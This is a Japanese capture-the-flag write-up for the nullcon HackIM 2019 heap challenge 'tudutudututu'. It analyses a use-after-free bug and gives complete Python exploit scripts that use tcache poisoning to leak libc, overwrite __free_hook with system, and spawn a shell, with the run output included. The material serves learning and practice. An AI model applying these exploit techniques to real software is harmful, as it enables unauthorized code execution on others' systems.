# [pwn 495pts] tudutudututu - nullcon HackIM 2019
64ビットでSSP + Full RELROの上FORTIFYも有効です。libcは配られていないようです。
```
$ checksec challenge 
[*] 'challenge'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Full RELRO
    PIE:        PIE disabled
    FORTIFY:    FORTIFY enabled
```
TODOリストが管理できるサービスです。
ヒープ系の問題ですね。
IDAで解析しましょう。

全部で16個のtodoを作ることができ、個数はグローバル変数で管理されています。

createでtodoのトピックを入力すると一度スタックに積まれます。
その後mallocで構造体(サイズ0x10)が確保され、先頭にstrdupでコピーされたtodoの名前へのポインタがコピーされます。
確保した構造体へのポインタはグローバル変数の配列に入れられます。

todoの内容を編集するには、生成時に入力したtodoのトピックを入力します。
すると、最後に作成されたものから順にトピックの名前をstrcmpで参照し、一致したものを編集します。
なお、既にtodoがある場合はfreeされます。
サイズを入力し、そのサイズ+1バイトだけmallocで確保されます。
このサイズはtodoの構造体にも入れられ、fgetsでdescを入力できます。
ということで構造体はこんな感じ。

```c
typedef struct {
    char *topic;
    char *desc;
} st_todo;
```

削除の際のfreeはこんな感じの順番です。
```c
free(todo->topic);
if (todo->desc) {
   free(todo->desc);
}
free(todo);
if (todo_num != 0) {
   int x;
   if (todo != todo_list[0]) {
      st_todo *ptr = todo_list[1];
      while(1) {
         x++;
         if (x == todo_num) return;
         if (todo == ptr) break;
         ptr++;
      }
   } else {
      x = 0;
   }
   todo_num--;
   todo_list[x] = todo_list[todo_num];
}
```
削除するとtodoの個数がデクリメントされます。
また、削除した箇所の構造体へのポインタが最後のtodoのポインタに書き換えられます。

さて、削除時にdescもfreeするのですが、最後に`todo->desc`にNULLを代入し忘れています。
また、descは編集時にmallocされるので、編集されていないdescをfreeできるかもしれません。
そうすれば、free済のチャンクを編集できることになるのでtcache poisoningが使えそうです。

そのためにはfreeの順番を考えましょう。
todoを1つ生成、編集すると次の順番でmallocされます。
```
todo = malloc(0x10);
todo->topic = malloc(0x1 ~ 0x200);
todo->desc = malloc(0x1 ~ 0xff);
```

削除は次の順番です。
```
free(todo->topic);
free(todo->desc);
free(todo);
```

順番が違うのでサイズを調整する必要があります。
まずはtodoをmallocしたときに削除したtopicやdescのアドレスが返るように調整しましょう。
もし可能なら、todo->descを任意のアドレスに調整でき、libcのアドレスリークができます。

まず、topic, descのサイズを0x10として確保、削除します。
するとtcacheは次のようにリンクされます。
```
tcache --> (todo0) --> (todo0->desc) --> (todo0->topic)
```

この状態でtopicのサイズを大きな値(0x40とします)にすればtcacheからはtodo0のみ取り出されます。
```
todo1 = todo0
todo1->topic = ?
todo1->desc = todo0->desc
```
さらに新しいtodoを(例えばtopicサイズ0x10で)作ると、tcacheから`todo0->desc`が取り出されるので、次のようになります。
```
todo2 = todo0->desc
todo2->topic = todo0->topic
todo2->desc = todo0->desc + 8
```
todo0で削除したdescの一部をtodo2のdescのポインタとして使えていることが分かります。
これを利用して適当な関数のアドレスをGOTから読んでみましょう。

```python
from ptrlib import *

def create_todo(topic):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def edit_todo(topic, desc, length):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("topic: ")
    sock.sendline(topic)
    sock.recvuntil("Desc length: ")
    sock.sendline(str(length))
    sock.recvuntil("Desc: ")
    sock.sendline(desc)

def delete_todo(topic):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def show_todo():
    sock.recvuntil("> ")
    sock.sendline("4")
    return sock.recvuntil("\n\n")

elf = ELF("./challenge")
sock = Process("./challenge")

fake_todo = b'AAAAAAAA' + p64(elf.got("__libc_start_main"))
create_todo("A" * 0x10)
edit_todo("A" * 0x10, fake_todo, 0x10)
delete_todo("A" * 0x10)
create_todo("B" * 0x40)
create_todo("C" * 0x10)
print(show_todo())
```

予想通りにアドレスが取れています！
```
$ python solve.py
[+] Process: Successfully created new process (PID=28700)
b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB - 0\nCCCCCCCCCCCCCCCC - \xe0\x02!a\xb9\x7f\n\n'
[+] close: './challenge' killed
```

本番環境で試して出てきたアドレスをlibc databaseで調べるとlibcを特定できました。

さて、この状態でtcacheは空です。
ここから任意アドレスの書き換えをしましょう。
今回はFull RELROなので`__free_hook`を`system`のアドレスに書き換えてシェルを起動します。

editの際にdescがNULLでなければ一度freeされます。
~~したがって、先程と同じような状態でeditすれば、freeしてすぐmallocするので結局descはfree前と変わらない状態になります。（サイズが同じtcacheに入る範囲である必要あり。）~~
freeのチェックに引っかかるのでダメでした。

ということでtcache poisoningに方針を切り換えます。
descのサイズを大きくして削除すれば、tcacheは次のようにリンクします。
```
tcache[i] --> (todo1) --> (todo1->topic)
tcache[j] --> (todo1->desc)
```
この状態で新しいtodoを確保して削除すると、tcacheは次のような状態になります。
```
tcache[i] --> (todo1) --> (todo1->topic)
tcache[j] --> (todo1->desc) --> (todo1->desc) [--> 無限のリンク]
```
~~ここでtopicのサイズを削除したdescと同じにしてtodoを確保し、topicとして好きなアドレスを設定するとtcacheは次のようになります。~~
topicのサイズはNULLまでなので、descを使います。
先程削除したdescと同じサイズのdescを確保し、好きなアドレスを書き込みます。
このときtcacheの状態は次のようになります。
```
tcache[i] --> 空
tcache[j] --> (todo1->desc) --> (address)
```

1つtodoを作り、topicを大きくします。
```
tcache[i] --> 空
tcache[j] --> address
```

1つtodoを作り、descを大きくして`system`のアドレスを書き込みます。
最後に`/bin/sh`というtopicのtodoを作って削除すればシェルが取れるはずです。

ということでコードをかきましょう。
```python
from ptrlib import *

def create_todo(topic):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def edit_todo(topic, desc, length):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("topic: ")
    sock.sendline(topic)
    sock.recvuntil("Desc length: ")
    sock.sendline(str(length))
    sock.recvuntil("Desc: ")
    sock.sendline(desc)

def delete_todo(topic):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def show_todo(lnum):
    sock.recvuntil("> ")
    sock.sendline("4")
    for i in range(lnum):
        ret = sock.recvline()
    return ret.rstrip()

elf = ELF("./challenge")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
#sock = Process("./challenge")
sock = Socket("127.0.0.1", 4003)

# leak libc base
fake_todo = b'AAAAAAAA' + p64(elf.got("__libc_start_main"))
create_todo("A" * 0x10)
edit_todo("A" * 0x10, fake_todo, 0x10)
delete_todo("A" * 0x10)
create_todo("B" * 0x40)
create_todo("C" * 0x10)
ret = show_todo(2)
addr = u64(ret[ret.rfind(b" - ") + 3:])
libc_base = addr - libc.symbol("__libc_start_main")
addr_system = libc_base + libc.symbol("system")
addr_free_hook = libc_base + libc.symbol("__free_hook")
dump("libc base = " + hex(libc_base))
assert 0xFFFFFFFF < libc_base

# overwrite __free_hook
create_todo("X" * 0x10)
edit_todo("X" * 0x10, "big todo", 0x30)
delete_todo("X" * 0x10)
create_todo("Y" * 0x10)
delete_todo("Y" * 0x10)
create_todo("Z" * 0x10)
edit_todo("Z" * 0x10, p64(addr_free_hook), 0x30)
create_todo("G" * 0x30)
create_todo("W" * 0x10)
edit_todo("W" * 0x10, p64(addr_system), 0x30)

# get the shell!
create_todo("/bin/sh")
delete_todo("/bin/sh")

sock.interactive()
```

tcache poisoningが必要と気づいてからここまで一発でいけました！
やっぱり紙に書いた理論が動くと楽しいなー。
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:4003
[ptrlib] libc base = 0x7fa8e25e1000
[ptrlib]$ ls
challenge
flag
[ptrlib]$ cat flag
hackim19{D0nt_f0r93t_t0_1ni7i4liz3}
[ptrlib]$
```

# 感想
~~だいぶヒープ慣れしてきた感じがします。~~
まだまだ手探り状態です、はい。
でもtcache poisoningはかなりできるようになってきました。
あとは使える脆弱性を見つけるまでの時間を短くしていきたい。